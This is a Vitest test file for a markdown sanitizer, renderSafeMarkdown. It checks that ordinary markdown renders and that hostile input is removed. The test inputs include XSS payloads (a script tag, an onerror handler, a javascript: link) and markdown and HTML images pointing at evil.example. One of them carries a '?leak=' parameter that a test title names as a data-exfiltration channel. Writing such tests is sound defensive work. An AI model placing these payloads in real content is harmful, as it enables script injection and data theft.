import { describe, expect, it } from "vitest";

import { renderSafeMarkdown } from "../markdown";

describe("renderSafeMarkdown", () => {
  it("renders ordinary markdown", () => {
    const html = renderSafeMarkdown("## 标题\n\n- 项目");

    expect(html).toContain("<h2>标题</h2>");
    expect(html).toContain("<li>项目</li>");
  });

  it("removes scripts and inline event handlers", () => {
    const html = renderSafeMarkdown(
      '<script>alert("xss")</script><img src="x" onerror="alert(1)">',
    );

    expect(html).not.toContain("<script");
    expect(html).not.toContain("onerror");
  });

  it("removes javascript urls", () => {
    const html = renderSafeMarkdown('[危险链接](javascript:alert("xss"))');

    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("returns an empty string for empty input", () => {
    expect(renderSafeMarkdown("")).toBe("");
  });

  it("移除 markdown 图片语法生成的 img，阻断外链数据外带通道", () => {
    const html = renderSafeMarkdown("![](https://evil.example/x.png?leak=秘密)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("移除原始 HTML 中的 img 标签", () => {
    const html = renderSafeMarkdown(
      '看这里 <img src="https://evil.example/x.png"> 结束',
    );

    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("看这里");
  });
});
